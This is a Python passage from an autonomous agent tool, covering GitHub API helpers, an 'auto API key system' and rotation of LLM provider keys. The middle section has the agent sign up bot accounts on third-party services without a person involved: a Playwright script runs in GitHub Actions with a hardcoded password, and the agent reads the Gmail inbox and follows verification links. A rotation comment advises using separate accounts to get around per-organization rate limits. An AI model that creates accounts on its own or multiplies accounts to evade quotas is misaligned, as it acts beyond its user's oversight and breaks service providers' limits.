            "https://api.github.com/user/repos",
            headers=headers,
            json={"name": repo_name, "description": description, "private": private},
            timeout=30
        )
        data = _github_json(response)
        if response.status_code not in [200, 201]:
            return "Could not create repo: " + str(data.get("message", data))
        return "Created repo: " + data.get("html_url", repo_name)
    except requests.exceptions.RequestException as e:
        return "ERROR: could not reach GitHub (" + str(e) + ")"

def get_github_file_sha(repo_name, file_path, branch=None):
    username = get_github_username()
    if not username:
        return None
    headers = github_headers()
    if headers is None:
        return None
    try:
        response = requests.get(
            "https://api.github.com/repos/" + username + "/" + repo_name + "/contents/" + file_path,
            headers=headers, params=({"ref": branch} if branch else None), timeout=30
        )
        if response.status_code == 200:
            return _github_json(response).get("sha")
    except requests.exceptions.RequestException:
        pass
    return None

def list_github_dir(repo_name, dir_path):
    """
    Lists filenames of files (not subfolders) directly inside dir_path in
    repo_name. Used by the site-edit workflow to discover which HTML
    pages an already-shipped multi-page site actually has, instead of
    guessing filenames. Returns [] on any failure (repo/folder missing,
    no username, network issue).
    """
    username = get_github_username()
    if not username:
        return []
    headers = github_headers()
    if headers is None:
        return []
    try:
        response = requests.get(
            "https://api.github.com/repos/" + username + "/" + repo_name + "/contents/" + dir_path,
            headers=headers, timeout=30
        )
        if response.status_code == 200:
            data = _github_json(response)
            if isinstance(data, list):
                return [item["name"] for item in data if item.get("type") == "file"]
    except requests.exceptions.RequestException:
        pass
    return []

def create_github_file(repo_name, file_path, content, commit_message="Added by my agent", branch=None):
    username = get_github_username()
    if not username:
        return "Could not determine GitHub username."
    headers = github_headers()
    if headers is None:
        return "Could not create file: GITHUB_TOKEN environment variable is not set."
    encoded_content = base64.b64encode(content.encode()).decode()
    body = {"message": commit_message, "content": encoded_content}
    if branch:
        body["branch"] = branch
    sha = get_github_file_sha(repo_name, file_path, branch=branch)
    if sha:
        body["sha"] = sha
    try:
        response = requests.put(
            "https://api.github.com/repos/" + username + "/" + repo_name + "/contents/" + file_path,
            headers=headers, json=body, timeout=30
        )
        data = _github_json(response)
        if response.status_code not in [200, 201]:
            return "Could not create file: " + str(data.get("message", data))
        return "Created file " + file_path + " in " + repo_name
    except requests.exceptions.RequestException as e:
        return "ERROR: could not reach GitHub (" + str(e) + ")"

def create_github_file_binary(repo_name, file_path, raw_bytes, commit_message="Added by my agent", branch=None):
    """
    Like create_github_file(), but for raw binary content (images, etc.)
    instead of text — avoids the str .encode() round-trip that would
    corrupt non-UTF8 bytes. Returns (success, message_or_raw_url).

    BUG FIX: this never accepted a branch argument and always hardcoded
    "main" in both the commit body and the returned raw.githubusercontent.com
    URL. Any caller working on a non-default branch (create_github_branch
    + PR workflows elsewhere in this file) would silently have this file
    land on "main" instead, and the returned raw_url would 404 or point at
    the wrong version of the file.
    """
    username = get_github_username()
    if not username:
        return False, "Could not determine GitHub username."
    headers = github_headers()
    if headers is None:
        return False, "Could not upload file: GITHUB_TOKEN environment variable is not set."
    encoded_content = base64.b64encode(raw_bytes).decode()
    body = {"message": commit_message, "content": encoded_content}
    if branch:
        body["branch"] = branch
    sha = get_github_file_sha(repo_name, file_path, branch=branch)
    if sha:
        body["sha"] = sha
    try:
        response = requests.put(
            "https://api.github.com/repos/" + username + "/" + repo_name + "/contents/" + file_path,
            headers=headers, json=body, timeout=30
        )
        data = _github_json(response)
        if response.status_code not in [200, 201]:
            return False, "Could not upload file: " + str(data.get("message", data))
        raw_url = "https://raw.githubusercontent.com/" + username + "/" + repo_name + "/" + (branch or "main") + "/" + file_path
        return True, raw_url
    except requests.exceptions.RequestException as e:
        return False, "ERROR: could not reach GitHub (" + str(e) + ")"

def create_github_branch(repo_name, new_branch, base_branch="main"):
    username = get_github_username()
    if not username:
        return False, "Could not determine GitHub username."
    headers = github_headers()
    if headers is None:
        return False, "Could not create branch: GITHUB_TOKEN environment variable is not set."
    try:
        ref_resp = requests.get(
            "https://api.github.com/repos/" + username + "/" + repo_name + "/git/ref/heads/" + base_branch,
            headers=headers, timeout=20
        )
        ref_data = _github_json(ref_resp)
        if ref_resp.status_code != 200:
            return False, "Could not read base branch: " + str(ref_data.get("message", ref_data))
        base_sha = ref_data["object"]["sha"]
        create_resp = requests.post(
            "https://api.github.com/repos/" + username + "/" + repo_name + "/git/refs",
            headers=headers,
            json={"ref": "refs/heads/" + new_branch, "sha": base_sha},
            timeout=20
        )
        create_data = _github_json(create_resp)
        if create_resp.status_code not in [200, 201]:
            return False, "Could not create branch: " + str(create_data.get("message", create_data))
        return True, "Created branch " + new_branch
    except requests.exceptions.RequestException as e:
        return False, "ERROR: could not reach GitHub (" + str(e) + ")"

def create_pull_request(repo_name, title, head_branch, base_branch="main", body=""):
    username = get_github_username()
    if not username:
        return False, "Could not determine GitHub username."
    headers = github_headers()
    if headers is None:
        return False, "Could not open PR: GITHUB_TOKEN environment variable is not set."
    try:
        response = requests.post(
            "https://api.github.com/repos/" + username + "/" + repo_name + "/pulls",
            headers=headers,
            json={"title": title, "head": head_branch, "base": base_branch, "body": body},
            timeout=20
        )
        data = _github_json(response)
        if response.status_code not in [200, 201]:
            return False, "Could not open PR: " + str(data.get("message", data))
        return True, data.get("html_url", "")
    except requests.exceptions.RequestException as e:
        return False, "ERROR: could not reach GitHub (" + str(e) + ")"

def trigger_github_workflow(repo_name, workflow_filename="run.yml", inputs=None, ref="main"):
    # BUG FIX: "ref" used to be hardcoded to "main" — dispatching a workflow
    # on a repo whose default branch is anything else (or where the workflow
    # file only exists on a feature branch) would fail with a 404/422 from
    # GitHub with no explanation. Now defaults to "main" but is overridable.
    username = get_github_username()
    if not username:
        return False, "Could not determine GitHub username."
    headers = github_headers()
    if headers is None:
        return False, "Could not trigger workflow: GITHUB_TOKEN environment variable is not set."
    url = "https://api.github.com/repos/" + username + "/" + repo_name + "/actions/workflows/" + workflow_filename + "/dispatches"
    payload = {"ref": ref}
    if inputs:
        payload["inputs"] = inputs
    try:
        response = requests.post(url, headers=headers, json=payload, timeout=20)
    except requests.exceptions.RequestException as e:
        return False, "ERROR: could not reach GitHub (" + str(e) + ")"
    if response.status_code == 204:
        return True, "Triggered."
    return False, "Failed to trigger run (" + str(response.status_code) + "): " + response.text

def get_latest_run(repo_name, workflow_filename="run.yml"):
    username = get_github_username()
    if not username:
        return None
    headers = github_headers()
    if headers is None:
        return None
    url = "https://api.github.com/repos/" + username + "/" + repo_name + "/actions/workflows/" + workflow_filename + "/runs"
    try:
        response = requests.get(url, headers=headers, params={"per_page": 1}, timeout=20)
        runs = _github_json(response).get("workflow_runs", [])
        if runs:
            return runs[0]
    except requests.exceptions.RequestException:
        pass
    return None

def wait_for_run_completion(repo_name, previous_run_id=None, workflow_filename="run.yml", timeout_seconds=300):
    waited = 0
    run = None
    while waited < timeout_seconds:
        time.sleep(10)
        waited += 10
        run = get_latest_run(repo_name, workflow_filename)
        if run and run.get("id") != previous_run_id and run.get("status") == "completed":
            return run
    return run

def get_run_logs(repo_name, run_id):
    username = get_github_username()
    if not username:
        return "Could not determine GitHub username."
    headers = github_headers()
    if headers is None:
        return "Could not fetch logs: GITHUB_TOKEN environment variable is not set."
    url = "https://api.github.com/repos/" + username + "/" + repo_name + "/actions/runs/" + str(run_id) + "/logs"
    try:
        response = requests.get(url, headers=headers, timeout=30)
        if response.status_code != 200:
            return "Could not fetch logs (" + str(response.status_code) + ")"
        with zipfile.ZipFile(io.BytesIO(response.content)) as z:
            all_text = ""
            for name in z.namelist():
                if name.endswith(".txt"):
                    all_text += z.read(name).decode("utf-8", errors="ignore") + "\n"
            return all_text
    except Exception as e:
        return "ERROR reading logs: " + str(e)

def ensure_github_pages_enabled(repo_name, branch="main", path="/"):
    username = get_github_username()
    if not username:
        return "Could not determine GitHub username."
    headers = github_headers()
    if headers is None:
        return "Could not enable Pages: GITHUB_TOKEN environment variable is not set."
    url = "https://api.github.com/repos/" + username + "/" + repo_name + "/pages"
    try:
        check = requests.get(url, headers=headers, timeout=20)
        if check.status_code == 200:
            return "Pages already enabled."
        response = requests.post(
            url, headers=headers,
            json={"source": {"branch": branch, "path": path}}, timeout=20
        )
        if response.status_code in (201, 204):
            return "Pages enabled."
        return "Could not enable Pages: " + str(_github_json(response))
    except requests.exceptions.RequestException as e:
        return "ERROR: could not reach GitHub (" + str(e) + ")"

# ============================================================
# AUTO API KEY SYSTEM
# ============================================================

API_KEYS_FILE = workpath("api_keys_store.json")
BROWSER_REPO_NAME = "agent-browser-automation"

def load_api_keys_store():
    return read_json_file(API_KEYS_FILE, {})

def save_api_key(service_name, api_key):
    store = load_api_keys_store()
    store[service_name] = api_key
    write_file(API_KEYS_FILE, json.dumps(store, indent=2))
    print("Saved API key for " + service_name + " to local store.")

def get_stored_api_key(service_name):
    store = load_api_keys_store()
    return store.get(service_name)

def is_api_key_error(error_text):
    signals = [
        "api_key", "apikey", "api key", "environment variable",
        "not set", "unauthorized", "401", "403", "missing key",
        "authentication", "auth", "token", "secret"
    ]
    lower = error_text.lower()
    return any(s in lower for s in signals)

def extract_service_name(error_text, idea):
    prompt = """This error happened while building a tool: """ + error_text[:500] + """
The tool idea was: """ + idea + """

What is the name of the API service that needs a key? (e.g. OpenWeatherMap, NewsAPI, CoinGecko)
Reply with ONLY the service name, nothing else."""
    return ask_ai(prompt).strip()

def find_keyless_api(task):
    print("Searching for a free keyless API alternative...")
    query = "free public API no key required for " + task + " site:rapidapi.com OR site:github.com OR site:publicapis.dev"
    results = search_web(query)
    if results.startswith("ERROR") or "No web results" in results:
        return None
    prompt = """Here are web search results for a free no-auth API:
""" + results + """

Task needed: """ + task + """

Extract ONE specific API endpoint URL that:
1. Requires NO API key or authentication
2. Can be called with a simple GET request
3. Returns useful data for the task above

Reply with ONLY the full URL, nothing else. If none found, reply: NONE"""
    url = ask_ai(prompt).strip()
    if url.upper() == "NONE" or not url.startswith("http"):
        return None
    print("Found keyless API: " + url)
    return url

def find_signup_url(service_name):
    results = search_web(service_name + " free API signup registration page")
    prompt = """Search results:
""" + results + """

Find the direct signup or registration URL for """ + service_name + """ free API access.
Reply with ONLY the URL, nothing else. If not found, reply: NONE"""
    url = ask_ai(prompt).strip()
    return url if url.upper() != "NONE" and url.startswith("http") else None

def check_inbox_for_api_key(sender_domain, wait_seconds=30):
    """Connects to Gmail via IMAP and looks for a verification email containing an API key."""
    agent_email = os.environ.get("AGENT_EMAIL")
    agent_password = os.environ.get("AGENT_APP_PASSWORD")
    if not agent_email or not agent_password:
        return None, "AGENT_EMAIL or AGENT_APP_PASSWORD not set in secrets."

    print("Waiting " + str(wait_seconds) + " seconds for verification email from " + sender_domain + "...")
    time.sleep(wait_seconds)

    try:
        mail = imaplib.IMAP4_SSL("imap.gmail.com")
        mail.login(agent_email, agent_password)
        mail.select("inbox")

        status, messages = mail.search(None, '(FROM "@' + sender_domain + '")')
        if status != "OK" or not messages[0]:
            mail.logout()
            return None, "No email found from " + sender_domain

        email_ids = messages[0].split()
        latest_id = email_ids[-1]
        status, msg_data = mail.fetch(latest_id, "(RFC822)")
        mail.logout()

        if status != "OK":
            return None, "Could not fetch email."

        msg = email.message_from_bytes(msg_data[0][1])
        body = ""
        if msg.is_multipart():
            for part in msg.walk():
                if part.get_content_type() == "text/plain":
                    body += part.get_payload(decode=True).decode("utf-8", errors="ignore")
        else:
            body = msg.get_payload(decode=True).decode("utf-8", errors="ignore")

        prompt = """Here is the content of a verification/welcome email:
""" + body[:2000] + """

Extract the API key from this email. It might be labeled as "API Key", "Your key", "Access token", etc.
Reply with ONLY the API key value, nothing else. If no key found, reply: NONE"""
        key = ask_ai(prompt).strip()
        if key.upper() == "NONE" or not key:
            prompt2 = """Here is a verification email body:
""" + body[:2000] + """

Extract the verification or activation URL from this email.
Reply with ONLY the URL, nothing else. If none found, reply: NONE"""
            link = ask_ai(prompt2).strip()
            if link.upper() != "NONE" and link.startswith("http"):
                print("Found verification link, clicking it...")
                try:
                    requests.get(link, timeout=15)
                    return None, "Clicked verification link but no API key in email yet."
                except Exception:
                    return None, "Could not click verification link."
            return None, "No API key or verification link found in email."

        return key, None

    except Exception as e:
        return None, "IMAP error: " + str(e)

# ============================================================
# GITHUB ACTIONS BROWSER AUTOMATION
# ============================================================

BROWSER_WORKFLOW_FILE = ".github/workflows/browser_register.yml"

def ensure_browser_repo():
    """Creates the dedicated browser automation repo if it doesn't exist."""
    print(create_github_repo(BROWSER_REPO_NAME, description="Browser automation for agent API key registration"))
    # Push a placeholder README so the repo is initialized
    create_github_file(BROWSER_REPO_NAME, "README.md", "# Agent Browser Automation\nUsed for auto API key registration.", "Init repo")

def build_browser_registration_script(service_name, signup_url):
    """Asks AI to write a Playwright script tailored to the specific signup page."""
    page_content = fetch_url(signup_url)
    prompt = """Write a complete Python Playwright script that:
1. Opens this signup page: """ + signup_url + """
2. Fills in the registration form using:
   - Email: read from os.environ['AGENT_EMAIL']
   - Name: "Agent Bot"
   - Password: "AgentBot2024!" (if required)
3. Submits the form
4. Prints "REGISTRATION_DONE" when complete
5. If a CAPTCHA is detected, prints "CAPTCHA_DETECTED" and exits

Page content for reference:
""" + page_content[:2000] + """

Use playwright.sync_api. Handle errors gracefully.
Reply with ONLY the Python code, no markdown fences."""
    return strip_fences(ask_ai(prompt))

def push_browser_workflow(registration_script):
    """Pushes the Playwright registration script and GitHub Actions workflow to the browser repo."""
    # Push the registration script
    create_github_file(BROWSER_REPO_NAME, "register.py", registration_script, "Update registration script")

    # Push the workflow that runs it with full Playwright support
    workflow = """name: Browser Registration

on:
  workflow_dispatch:
    inputs:
      service_name:
        description: 'Service to register for'
        required: true

jobs:
  register:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4

      - name: Set up Python
        uses: actions/setup-python@v5
        with:
          python-version: '3.11'

      - name: Install dependencies
        run: |
          pip install playwright requests
          playwright install chromium
          playwright install-deps chromium

      - name: Run registration
        env:
          AGENT_EMAIL: ${{ secrets.AGENT_EMAIL }}
          AGENT_APP_PASSWORD: ${{ secrets.AGENT_APP_PASSWORD }}
        run: python register.py

      - name: Done
        run: echo "Browser registration workflow completed"
"""
    create_github_file(BROWSER_REPO_NAME, BROWSER_WORKFLOW_FILE, workflow, "Update browser workflow")

def push_browser_repo_secrets():
    """Pushes AGENT_EMAIL and AGENT_APP_PASSWORD to the browser repo secrets."""
    username = get_github_username()
    agent_email = os.environ.get("AGENT_EMAIL", "")
    agent_password = os.environ.get("AGENT_APP_PASSWORD", "")

    # Get the repo's public key for secret encryption
    try:
        key_resp = requests.get(
            "https://api.github.com/repos/" + username + "/" + BROWSER_REPO_NAME + "/actions/secrets/public-key",
            headers=github_headers(), timeout=20
        )
        if key_resp.status_code != 200:
            return False, "Could not get repo public key."
        pub_key_data = key_resp.json()
        pub_key = pub_key_data["key"]
        pub_key_id = pub_key_data["key_id"]
    except Exception as e:
        return False, "Error getting public key: " + str(e)

    # Encrypt and push each secret using libsodium via PyNaCl
    try:
        from base64 import b64encode
        from nacl import encoding, public

        def encrypt_secret(pub_key_b64, secret_value):
            pub_key_bytes = base64.b64decode(pub_key_b64)
            sealed_box = public.SealedBox(public.PublicKey(pub_key_bytes))
            encrypted = sealed_box.encrypt(secret_value.encode("utf-8"))
            return base64.b64encode(encrypted).decode("utf-8")

        for secret_name, secret_value in [("AGENT_EMAIL", agent_email), ("AGENT_APP_PASSWORD", agent_password)]:
            encrypted = encrypt_secret(pub_key, secret_value)
            resp = requests.put(
                "https://api.github.com/repos/" + username + "/" + BROWSER_REPO_NAME + "/actions/secrets/" + secret_name,
                headers=github_headers(),
                json={"encrypted_value": encrypted, "key_id": pub_key_id},
                timeout=20
            )
            if resp.status_code not in (201, 204):
                return False, "Could not push secret " + secret_name

        return True, "Secrets pushed."
    except ImportError:
        return False, "PyNaCl not installed — secrets must be added manually to the browser repo."
    except Exception as e:
        return False, "Error pushing secrets: " + str(e)

def extract_api_key_from_logs(logs, service_name):
    """Asks AI to find the API key inside the GitHub Actions log output."""
    prompt = """Here are the GitHub Actions logs from a registration attempt for """ + service_name + """:

""" + logs[-3000:] + """

Extract the API key or access token from these logs if present.
Reply with ONLY the key value, nothing else. If not found, reply: NONE"""
    result = ask_ai(prompt).strip()
    return result if result.upper() != "NONE" else None

def register_via_github_actions(service_name, idea):
    """
    Full GitHub Actions browser registration flow:
    1. Creates/updates browser automation repo
    2. Generates Playwright script for the signup page
    3. Pushes workflow + script to GitHub
    4. Triggers the workflow
    5. Waits for completion
    6. Checks logs + Gmail inbox for the API key
    """
    # Check stored keys first
    stored = get_stored_api_key(service_name)
    if stored:
        print("Found stored API key for " + service_name)
        return stored

    agent_email = os.environ.get("AGENT_EMAIL")
    if not agent_email:
        print("No AGENT_EMAIL configured. Skipping auto-registration.")
        return None

    signup_url = find_signup_url(service_name)
    if not signup_url:
        print("Could not find signup URL for " + service_name)
        return None

    print("Setting up GitHub Actions browser automation for " + service_name + "...")
    print("Signup URL: " + signup_url)

    # Ensure the browser repo exists
    ensure_browser_repo()

    # Push secrets to the browser repo
    ok, msg = push_browser_repo_secrets()
    print("Secrets: " + msg)

    # Generate and push the Playwright registration script
    print("Generating registration script for " + service_name + "...")
    reg_script = build_browser_registration_script(service_name, signup_url)
    push_browser_workflow(reg_script)

    # Trigger the workflow
    time.sleep(3)
    previous_run = get_latest_run(BROWSER_REPO_NAME, "browser_register.yml")
    previous_run_id = previous_run.get("id") if previous_run else None

    triggered, msg = trigger_github_workflow(
        BROWSER_REPO_NAME,
        "browser_register.yml",
        inputs={"service_name": service_name}
    )
    if not triggered:
        print("Could not trigger browser workflow: " + msg)
        return None

    print("GitHub Actions browser workflow triggered! Waiting for Chromium to register...")
    print("(This installs Chromium on GitHub's servers and fills the signup form — takes 2-3 minutes)")

    run = wait_for_run_completion(
        BROWSER_REPO_NAME,
        previous_run_id=previous_run_id,
        workflow_filename="browser_register.yml",
        timeout_seconds=300
    )

    if not run or run.get("id") == previous_run_id:
        print("Browser workflow timed out.")
        return None

    conclusion = run.get("conclusion")
    logs = get_run_logs(BROWSER_REPO_NAME, run.get("id"))

    print("Browser workflow finished with: " + str(conclusion))

    if "CAPTCHA_DETECTED" in logs:
        print("CAPTCHA detected on signup page — cannot auto-register.")
        return None

    # Try to extract key from logs directly
    api_key = extract_api_key_from_logs(logs, service_name)
    if api_key:
        print("API key found in workflow logs!")
        save_api_key(service_name, api_key)
        return api_key

    # Fall back to checking Gmail inbox
    print("Key not in logs — checking Gmail inbox...")
    domain_match = re.search(r"https?://(?:www\.)?([^/]+)", signup_url)
    sender_domain = domain_match.group(1) if domain_match else service_name.lower().replace(" ", "")
    api_key, error = check_inbox_for_api_key(sender_domain, wait_seconds=20)

    if api_key:
        print("API key retrieved from Gmail!")
        save_api_key(service_name, api_key)
        return api_key

    print("Could not retrieve API key: " + str(error))
    return None

def handle_api_key_error(error_text, idea):
    """
    Full resolution flow:
    1. Try keyless API alternative
    2. Try GitHub Actions browser registration
    3. Fall back to asking user
    """
    print("API key error detected. Starting auto-resolution flow...")

    # Step 1: Try keyless alternative
    keyless_url = find_keyless_api(idea)
    if keyless_url:
        return keyless_url, None, None

    # Step 2: GitHub Actions browser registration
    service_name = extract_service_name(error_text, idea)
    print("Identified service: " + service_name)
    api_key = register_via_github_actions(service_name, idea)
    if api_key:
        return None, api_key, None

    # Step 3: Try one more keyless search
    keyless_url2 = find_keyless_api(idea + " without authentication free tier")
    if keyless_url2:
        return keyless_url2, None, None

    # Step 4: Ask user
    msg = ("Could not auto-resolve API key for: " + service_name + "\n"
           "Please register manually at their website and add the key to Replit secrets,\n"
           "then run the build command again.")
    return None, None, msg

# ============================================================
# CEREBRAS MULTI-KEY ROTATION
# ============================================================

# Auto-detects any number of Cerebras keys instead of a hardcoded 2, so
# adding a 3rd/4th/9th key is just adding a Replit secret — no code
# change needed. Accepts CEREBRAS_API_KEY (first/primary) plus
# CEREBRAS_API_KEY_2, CEREBRAS_API_KEY_3, ... CEREBRAS_API_KEY_99.
# NOTE: rate limits on Cerebras apply per ORGANIZATION, not per key —
# multiple keys from the SAME account share one quota pool and won't
# add real capacity. Each key here should come from a separate account
# for this rotation to actually help.
def _load_cerebras_keys():
    keys = []
    primary = os.environ.get("CEREBRAS_API_KEY")
    if primary:
        keys.append(primary)
    i = 2
    while True:
        k = os.environ.get("CEREBRAS_API_KEY_" + str(i))
        if not k:
            break
        keys.append(k)
        i += 1
    return keys

CEREBRAS_KEYS = _load_cerebras_keys()

# OPENROUTER — pooled together WITH Cerebras (not a fallback tier like
# Groq below). One OPENROUTER_API_KEY, rotated across several different
# free models. Real capacity gain: Cerebras and OpenRouter have
# completely independent daily quotas, so spreading real traffic across
# both (not just falling back on failure) increases total daily
# throughput instead of just adding a backup.
OPENROUTER_API_KEY = os.environ.get("OPENROUTER_API_KEY")
OPENROUTER_FREE_MODELS = [
    "meta-llama/llama-3.3-70b-instruct:free",
    "qwen/qwen3-coder:free",
    "deepseek/deepseek-r1:free",
    "meta-llama/llama-4-scout:free",
    "openai/gpt-oss-120b:free",
    "google/gemma-3-12b:free",
]

def _build_provider_pool():
    """
    Builds the unified rotation pool that ask_ai() actually draws from:
    one slot per Cerebras key, plus (if OPENROUTER_API_KEY is set) one
    slot per free OpenRouter model on the single OpenRouter key. Cerebras
    and OpenRouter slots are interchangeable from the rotation's point of
    view — _pick_available_key_index() just hands back whichever slot is
    idle/off-cooldown, same as it always did across Cerebras keys alone.
    Groq is NOT part of this pool; it's a separate fallback tier tried
    only after every slot here has failed (see ask_ai()).
    """
    pool = [{"provider": "cerebras", "key": k, "model": "gpt-oss-120b"} for k in CEREBRAS_KEYS]
    if OPENROUTER_API_KEY:
        pool += [{"provider": "openrouter", "key": OPENROUTER_API_KEY, "model": m} for m in OPENROUTER_FREE_MODELS]
    return pool

PROVIDER_POOL = _build_provider_pool()

# GROQ — used as a fallback only once every slot in PROVIDER_POOL
# (Cerebras + OpenRouter) is exhausted/rate-limited (see ask_ai()). Same
# multi-key pattern: GROQ_API_KEY (first/primary) plus GROQ_API_KEY_2,
# GROQ_API_KEY_3, ... GROQ_API_KEY_99.
def _load_groq_keys():
    keys = []
    primary = os.environ.get("GROQ_API_KEY")
    if primary:
        keys.append(primary)
    i = 2
    while True:
        k = os.environ.get("GROQ_API_KEY_" + str(i))
        if not k:
            break
        keys.append(k)
        i += 1
    return keys

GROQ_KEYS = _load_groq_keys()
GROQ_MODEL = "llama-3.3-70b-versatile"

_groq_key_lock = threading.Lock()
_groq_key_state = {i: {"cooldown_until": 0.0, "in_use": False} for i in range(len(GROQ_KEYS))}

def _pick_available_groq_key_index():
    now = time.time()
    with _groq_key_lock:
        not_cooling = [i for i in range(len(GROQ_KEYS)) if _groq_key_state[i]["cooldown_until"] <= now]
        idle = [i for i in not_cooling if not _groq_key_state[i]["in_use"]]
        if idle:
            chosen = idle[0]
        elif not_cooling:
            chosen = not_cooling[0]
        else:
            chosen = min(range(len(GROQ_KEYS)), key=lambda i: _groq_key_state[i]["cooldown_until"])
        _groq_key_state[chosen]["in_use"] = True
        return chosen

def _mark_groq_key_rate_limited(index, cooldown_seconds=60):
    with _groq_key_lock:
        _groq_key_state[index]["cooldown_until"] = time.time() + cooldown_seconds

GEMINI_API_KEY = os.environ.get("GEMINI_API_KEY")
# Optional: a Firebase project's public web config, pasted as JSON into a
# Replit secret. This is NOT a secret key in the traditional sense (it's
# meant to be embedded client-side and is protected by Firestore security
# rules, not by being hidden) — but storing it once as a secret avoids
# retyping it. Free forever on Firebase's Spark plan, no billing account
# needed. Powers real accounts/login + private per-user data for sites
# that need it, which kvdb.io (public shared data only) can't do.
_FIREBASE_CONFIG_RAW = os.environ.get("FIREBASE_CONFIG")
try:
    FIREBASE_CONFIG = json.loads(_FIREBASE_CONFIG_RAW) if _FIREBASE_CONFIG_RAW else None
except (json.JSONDecodeError, TypeError):
    FIREBASE_CONFIG = None
GEMINI_MODEL = "gemini-2.5-flash"
GEMINI_IMAGE_MODEL = "gemini-2.5-flash-image"  # Gemini's native image-generation model ("Nano Banana")

_key_lock = threading.Lock()
_key_state = {i: {"cooldown_until": 0.0, "in_use": False} for i in range(len(PROVIDER_POOL))}
_current_key_index = [0]

def _pick_available_key_index():
    now = time.time()
    with _key_lock:
        not_cooling = [i for i in range(len(PROVIDER_POOL)) if _key_state[i]["cooldown_until"] <= now]
        # Prefer a slot that's both off cooldown AND not currently in use by
        # another concurrent call (e.g. a parallel goal-step or the dreamer
        # running alongside the main thread) — otherwise concurrent callers
        # all pile onto the same slot even when others are sitting idle.
        idle = [i for i in not_cooling if not _key_state[i]["in_use"]]
        if idle:
            chosen = idle[0]
        elif not_cooling:
            chosen = not_cooling[0]
        else:
            chosen = min(range(len(PROVIDER_POOL)), key=lambda i: _key_state[i]["cooldown_until"])
        # Mark it in_use in the SAME critical section as the pick, so two
        # concurrent callers can't both pick the same idle slot before
        # either has a chance to mark it busy.
        _key_state[chosen]["in_use"] = True
        _current_key_index[0] = chosen
        return chosen

def _mark_key_rate_limited(index, cooldown_seconds=60):
    with _key_lock:
        _key_state[index]["cooldown_until"] = time.time() + cooldown_seconds
        _current_key_index[0] = (index + 1) % len(PROVIDER_POOL)

def keys_are_free():
    now = time.time()
    with _key_lock:
        for i in range(len(PROVIDER_POOL)):
            if _key_state[i]["cooldown_until"] > now:
                return False
            if _key_state[i]["in_use"]:
                return False
        return True

# Global system prompt — overridden in spawned agents
AGENT_SYSTEM_PROMPT = ""
AGENT_NAME = "main"
AGENT_PURPOSE = "General-purpose agent"

def ask_gemini(message, system=None):
    """
    Standalone Gemini caller — independent of ask_ai()/Cerebras.
    Not used as a fallback anywhere; call it directly wherever you want
    Gemini specifically (e.g. summarizing Firecrawl results, a second
    opinion, etc). Returns the reply text, or a string starting with
    "ERROR:" on failure.
    """
    if not GEMINI_API_KEY:
        return "ERROR: no GEMINI_API_KEY found in environment/secrets."
    body = {"contents": [{"role": "user", "parts": [{"text": message}]}]}
    if system:
        body["system_instruction"] = {"parts": [{"text": system}]}
    try:
        response = requests.post(
            "https://generativelanguage.googleapis.com/v1beta/models/" + GEMINI_MODEL + ":generateContent",
            headers={"x-goog-api-key": GEMINI_API_KEY, "Content-Type": "application/json"},
            json=body,
            timeout=30
        )
    except requests.exceptions.RequestException as e:
        return "ERROR: could not reach Gemini (" + str(e) + ")"
    if response.status_code == 429:
        return "ERROR: Gemini rate limited"
    try:
        data = response.json()
        return data["candidates"][0]["content"]["parts"][0]["text"]
    except Exception:
        return "ERROR: Gemini response error: " + str(response.text[:300])

def ask_gemini_image(prompt, aspect_ratio=None):
    """
    Generates an image with Gemini's native image model and returns
    (image_bytes, mime_type) on success, or (None, "ERROR: ...") on
    failure — mirrors the (ok, result) shape used elsewhere in this file
    (e.g. create_github_file_binary) so callers can branch the same way.
    Independent of ask_gemini()/ask_ai(); hits GEMINI_IMAGE_MODEL directly
    with responseModalities=["IMAGE"] and pulls the base64 image out of
    the first inlineData part in the response.
    """
    if not GEMINI_API_KEY:
        return None, "ERROR: no GEMINI_API_KEY found in environment/secrets."
    body = {
        "contents": [{"role": "user", "parts": [{"text": prompt}]}],
        "generationConfig": {"responseModalities": ["IMAGE"]}
    }
    if aspect_ratio:
        body["generationConfig"]["imageConfig"] = {"aspectRatio": aspect_ratio}
    try:
        response = requests.post(
            "https://generativelanguage.googleapis.com/v1beta/models/" + GEMINI_IMAGE_MODEL + ":generateContent",
            headers={"x-goog-api-key": GEMINI_API_KEY, "Content-Type": "application/json"},
            json=body,
            timeout=60
        )
    except requests.exceptions.RequestException as e:
        return None, "ERROR: could not reach Gemini (" + str(e) + ")"
    if response.status_code == 429:
        return None, "ERROR: Gemini rate limited"
    if response.status_code != 200:
        return None, "ERROR: Gemini image request failed (" + str(response.status_code) + "): " + str(response.text[:300])
    try:
        data = response.json()
        parts = data["candidates"][0]["content"]["parts"]
        for part in parts:
            inline = part.get("inlineData") or part.get("inline_data")
            if inline and inline.get("data"):
                mime_type = inline.get("mimeType") or inline.get("mime_type") or "image/png"
                return base64.b64decode(inline["data"]), mime_type
        return None, "ERROR: Gemini response had no image data (likely blocked or text-only reply): " + str(response.text[:300])
    except Exception:
        return None, "ERROR: Gemini image response error: " + str(response.text[:300])

def ask_gemini_vision(images, prompt):
    """
    Multimodal Gemini caller: sends one or more images + a text prompt in
    a single request, returns the text reply (or a string starting with
    "ERROR:" on failure) — same response shape as ask_gemini(). Independent
    of ask_gemini_image() (which goes the other direction: text in, image
    out). `images` is a list of (image_bytes, mime_type) tuples, appended
    after the prompt text in the order given — callers should describe
    that order (e.g. "screenshot 1 is desktop, screenshot 2 is mobile")
    inside the prompt itself so the model knows which is which. Used for
    visual QA on generated websites, where a screenshot needs to be judged
    by something that can actually see it, not just read the underlying
    HTML/CSS.
    """
    if not GEMINI_API_KEY:
        return "ERROR: no GEMINI_API_KEY found in environment/secrets."
    parts = [{"text": prompt}]
    for image_bytes, mime_type in images:
        parts.append({"inlineData": {"mimeType": mime_type, "data": base64.b64encode(image_bytes).decode("ascii")}})
    body = {"contents": [{"role": "user", "parts": parts}]}
    try:
        response = requests.post(
            "https://generativelanguage.googleapis.com/v1beta/models/" + GEMINI_MODEL + ":generateContent",
            headers={"x-goog-api-key": GEMINI_API_KEY, "Content-Type": "application/json"},
            json=body,
            timeout=30
        )
    except requests.exceptions.RequestException as e:
        return "ERROR: could not reach Gemini (" + str(e) + ")"
    if response.status_code == 429:
        return "ERROR: Gemini rate limited"
    if response.status_code != 200:
        return "ERROR: Gemini vision request failed (" + str(response.status_code) + "): " + str(response.text[:300])
    try:
        data = response.json()
        return data["candidates"][0]["content"]["parts"][0]["text"]
    except Exception:
        return "ERROR: Gemini response error: " + str(response.text[:300])

def ask_ai(message, system=None):
    if not PROVIDER_POOL and not GROQ_KEYS:
